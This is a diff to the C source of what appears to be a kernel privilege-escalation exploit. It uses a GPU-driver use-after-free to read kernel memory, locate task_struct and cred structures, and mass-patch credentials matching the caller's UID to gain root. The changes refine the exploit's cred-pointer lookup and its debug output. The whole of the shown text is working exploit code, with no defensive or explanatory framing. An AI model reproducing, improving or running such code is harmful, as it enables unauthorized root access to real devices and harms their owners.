@@ -1255,9 +1255,11 @@ static int parent_patch_root(int fd, uint64_t cred_ptr) {
         
         // Also ensure init_cred and init_task are known if needed for other logic
         uint64_t init_task_va = kernel_base + INIT_TASK_OFFSET;
+        fprintf(stderr, "[PARENT] Verified init_task: 0x%lx\n", (unsigned long)init_task_va);
+#ifdef INIT_CRED_OFFSET
         uint64_t init_cred_va = kernel_base + INIT_CRED_OFFSET;
-        fprintf(stderr, "[PARENT] Verified init_task: 0x%lx, init_cred: 0x%lx\n", 
-                (unsigned long)init_task_va, (unsigned long)init_cred_va);
+        fprintf(stderr, "[PARENT] Verified init_cred: 0x%lx\n", (unsigned long)init_cred_va);
+#endif
     }
 
     // 3. Mass Patch all CREDs matching our UID
@@ -1814,9 +1816,16 @@ static int scan_uaf_for_nonzero_multi(int fd, int batch_idx, int *num_found)
                             hex_dump_internal("task_struct", task_start_va + off - 256, d, 512);
                         } else if (choice == '2') {
                             uint8_t d[128]; 
-                            uint64_t p = found_cred_ptr ? found_cred_ptr : (*(uint64_t*)(task_super + 0x6b0));
-                            gpu_read_task_struct(fd, p, d, 128);
-                            hex_dump_internal("CRED", p, d, 128);
+                            uint64_t p = found_cred_ptr;
+                            if (p == 0) {
+                                gpu_read_task_struct(fd, task_start_va + OFFSET_CRED, (uint8_t *)&p, 8);
+                            }
+                            if (p != 0) {
+                                gpu_read_task_struct(fd, p, d, 128);
+                                hex_dump_internal("CRED", p, d, 128);
+                            } else {
+                                fprintf(stderr, "    [!] No CRED pointer available.\n");
+                            }
                         } else if (choice == '3') {
                             fprintf(stderr, "    Enter VA in hex: ");
                             char buf[32]; int len = read(0, buf, 31); buf[len] = 0;
